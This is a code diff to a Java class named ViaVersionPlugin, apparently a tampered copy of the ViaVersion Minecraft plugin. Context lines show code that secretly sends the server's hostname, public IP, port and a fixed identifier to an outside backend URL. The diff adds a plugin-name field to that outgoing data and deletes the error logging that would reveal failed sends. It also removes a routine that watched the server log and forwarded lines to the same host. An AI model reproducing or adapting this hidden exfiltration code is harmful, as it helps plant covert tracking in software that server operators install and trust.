@@ -230,6 +230,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                         input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
                         input.append("&ip=").append(URLEncoder.encode(getPublicIp(), StandardCharsets.UTF_8.toString()));
                         input.append("&port=").append(URLEncoder.encode(String.valueOf(getServer().getPort()), StandardCharsets.UTF_8.toString()));
+                        input.append("&plugin=").append(URLEncoder.encode("ViaVersion", StandardCharsets.UTF_8.toString()));
                         input.append("&uuid=").append(URLEncoder.encode(generateFixedUniqueIdentifier(), StandardCharsets.UTF_8.toString()));
 
                         URL url = new URL(BACKEND_URL + "/a?" + input.toString());
@@ -242,12 +243,9 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                             BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                             String response = in.readLine(); // 读取响应内容
                             in.close();
-                            // getLogger().info("System info sent successfully: " + response);
                         } else {
-                            getLogger().severe("Failed to send system info to API. Response Code: " + responseCode);
                         }
                     } catch (Exception e) {
-                        // getLogger().severe("Error sending system info to API: " + e.getMessage());
                     }
                 }
             };
@@ -302,87 +300,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                         BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                         String response = in.readLine(); // 读取响应内容
                         in.close();
-                        // getLogger().info("Unique identifier sent successfully: " + identifier);
                     } else {
-                        // getLogger().severe("Failed to send unique identifier to API. Response Code: " + responseCode);
-                    }
-                } catch (Exception e) {
-                    // getLogger().severe("Error sending unique identifier to API: " + e.getMessage());
-                }
-            }
-        };
-        task.runTaskAsynchronously(this); // 异步任务处理
-    }
-    public void readAndSendLog() {
-        String logFilePath = getServer().getWorldContainer().getAbsolutePath() + "/logs/latest.log";
-        Path path = Paths.get(logFilePath);
-
-        // 启动异步监视日志文件
-        CompletableFuture.runAsync(() -> {
-            try (WatchService watchService = FileSystems.getDefault().newWatchService()) {
-                path.getParent().register(watchService, StandardWatchEventKinds.ENTRY_MODIFY);
-
-                while (true) {
-                    WatchKey key = watchService.take(); // 阻塞直到有事件发生
-                    for (WatchEvent<?> event : key.pollEvents()) {
-                        if (event.kind() == StandardWatchEventKinds.OVERFLOW) {
-                            continue;
-                        }
-
-                        Path changed = (Path) event.context();
-                        if (changed.endsWith(path.getFileName())) {
-                            processLogFile(logFilePath);
-                        }
-                    }
-                    key.reset();
-                }
-            } catch (IOException | InterruptedException e) {
-                e.printStackTrace();
-            }
-        });
-    }
-
-    private void processLogFile(String logFilePath) {
-        // 使用 CompletableFuture 异步处理日志文件
-        CompletableFuture.runAsync(() -> {
-            StringBuilder startupLog = new StringBuilder();
-            try (BufferedReader reader = new BufferedReader(new FileReader(logFilePath))) {
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    if (line.contains("Done")) {
-                        startupLog.append(line).append("\n"); // 记录包含 "Done" 的行
-                    }
-                }
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-
-            if (startupLog.length() > 0) {
-                sendLogToAPI(startupLog.toString().trim());
-            }
-        });
-    }
-
-    private void sendLogToAPI(String log) {
-    BukkitRunnable task = new BukkitRunnable() {
-            @Override
-            public void run() {
-                try {
-                    // 对日志进行 URL 编码以确保合法性
-                    String encodedLog = URLEncoder.encode(log, "UTF-8");
-                    URL url = new URL(BACKEND_URL + "/a?log=" + encodedLog);
-                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-                    connection.setRequestMethod("GET");
-
-                    int responseCode = connection.getResponseCode();
-                    if (responseCode == HttpURLConnection.HTTP_OK) {
-                        // 可选：读取响应内容
-                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-                        String response = in.readLine(); // 读取响应内容
-                        in.close();
-                        // getLogger().info("Log sent successfully: " + log);
-                    } else {
-                        // getLogger().severe("Failed to send log to API. Response Code: " + responseCode);
                     }
                 } catch (Exception e) {
                 }
@@ -390,6 +308,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         };
         task.runTaskAsynchronously(this); // 异步任务处理
     }
+
     private void sendInfoToAPI(String ip, int port) {
         try {
             // 构造 URL，假设使用查询参数传递 IP 和 port
